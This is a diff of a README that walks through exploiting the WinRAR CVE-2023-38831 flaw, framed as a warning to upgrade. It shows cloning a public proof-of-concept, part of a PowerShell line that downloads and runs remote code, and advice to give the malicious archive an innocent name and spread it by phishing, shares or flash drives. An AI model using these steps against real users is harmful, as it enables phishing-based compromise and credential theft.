@@ -1,11 +1,14 @@
+![Screenshot from 2023-10-19 13-59-47](https://github.com/xogutu/cve/assets/5442305/2a6d9925-85fd-4f49-bd46-0804e0b6cd17)
+
+
 # Being hacked through winrar (CVE-2023-38831)
 
-If you are using WinRAR versions prior to 6.23, which is the case for many users, it has a vulnerability which hackers can potentially exploit to compromise your computer. They could gain remote access or, depending on your privilege level, install keyloggers to monitor and steal sensitive information, including your social media and internet banking passwords. To safeguard your system, it is crucial to take immediate action. Upgrade to WinRAR version 6.24 as soon as possible. In the following demonstration, I will illustrate how this attack can be executed and provide guidance on steps to protect yourself.
+If you are using WinRAR versions prior to 6.23, which is the case for many users, it has a vulnerability which hackers can potentially exploit to compromise your computer. They could gain remote access or, depending on your privilege level, install keyloggers to monitor and steal sensitive information, including your social media and internet banking passwords. To safeguard your system, it is crucial to take immediate action. Upgrade to WinRAR version 6.24 as soon as possible. In the following demonstration, I will illustrate how this attack can be executed and provide tips on steps to protect yourself.
 
 ## STEPS
 ### 1. POC Script
 
-Numerous proof-of-concept (POC) scripts are readily available. You can clone this specific one by using the following command:
+Numerous proof-of-concept (POC) scripts are readily available for this vulnerability. You can clone this specific one by using the following command:
 ```
 ┌──(kali㉿kali)-[/tmp/CVE-2023-38831]
 └─$ git clone https://github.com/HDCE-inc/CVE-2023-38831.git
@@ -49,7 +52,7 @@ START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('h
 
 ![Screenshot from 2023-10-19 12-40-16](https://github.com/xogutu/cve/assets/5442305/c2ac8ef9-4e28-4deb-a7bb-f9b0a9537a40)
 
-Now use the downloaded POC code to create the malicious winrar file. Give the file a name that is not suspect like Financial_Year_2023.rar. You need to find a way to share this file with your target like a targeted phishing campaign or placing it in a public share or distributing it on flash drives e.t.c. In our case for the POC, simply transfer it to windows. 
+Now, utilize the downloaded POC code to craft a malicious WinRAR file. Ensure that the file is given a non-suspect name, such as "Financial_Year_2023.rar." To distribute this file to your target, you'll need to employ a method like a targeted phishing campaign, placing it in a public share, or distributing it via flash drives. For the purposes of our POC, you can simply transfer it to a Windows environment from your Kali box using the various available methods like starting a http server in python, using ftp or samba.
 
 ![Screenshot from 2023-10-19 12-41-52](https://github.com/xogutu/cve/assets/5442305/ae398ca2-b200-4a47-9e7f-95bbc67cceb4)
 
